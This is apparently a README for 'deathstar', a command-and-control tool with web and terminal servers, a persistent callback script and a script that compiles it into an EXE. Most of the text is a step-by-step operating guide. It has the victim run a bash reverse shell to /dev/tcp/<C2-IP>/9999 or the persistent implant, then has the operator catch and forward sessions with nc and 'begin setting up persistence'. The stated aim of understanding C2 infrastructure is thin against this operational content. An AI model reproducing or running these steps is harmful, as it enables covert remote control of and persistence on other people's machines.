# deathstar
Build and understand C2 infrastructure.

`Deathstar` has a webpage, or a terminal based C2 connection manager.

`stardestroyer.py` is one option of calling into the C2 server.

`compiler.sh` will compile `stardestroyer.py` into an EXE.

# Web based C2
![image](https://github.com/user-attachments/assets/2276420d-6134-48a0-8e2e-5e6a0ddef95b)

# CLI based C2
![image](https://github.com/user-attachments/assets/e574c863-f44f-47fb-ad8a-7c3148b247e2)

# Download deathstar

```git clone github.com/bwithe/deathstar```

# Web C2 server 
1. Start the server
  - `python3 deathstar-web.py`
2. Open link in web browser
  - `firefox 127.0.0.1:5000`
3. Have Victim connect to C2
  - Linux / MacOS
    - `bash -i >& /dev/tcp/<C2-IP>/9999 0>&1`
    - This will drop the moment the C2 server 'drops'
OR
    - This will continue to connect to the C2 server even after it 'drops'
    - `./stardestroyer.py &`
4. Start your listener 
  - `nc -nvlp 4444`
5. Forward the connection to your listener
  - On the webpage, type the IP of the listening device, and then click forward.
6. Catch the connection
  - Once you've caught the connection, begin setting up persistence.
7. Wash, rince, repeat.

# CLI C2 server
1. Start the server
  - `python3 deathstar-term.py`
2. Have Victim connect to C2
  - Linux / MacOS
    - `bash -i >& /dev/tcp/<C2-IP>/9999 0>&1`
    - This will drop the moment the C2 server 'drops'
OR
    - This will continue to connect to the C2 server even after it 'drops'
    - `./stardestroyer.py &`
3. Start your listener 
  - `nc -nvlp 4444`
4. Forward the connection to your listener
  - On the CLI, list the connections.
    - Select `2)` to forward.
    - Specify the `ID` of the `VICTIM` you'd like to forward.
    - Then, type the IP of your `LISTENING` device.
5.Catch the connection
  - Once you've caught the connection, begin setting up persistence.
6. Wash, rince, repeat.

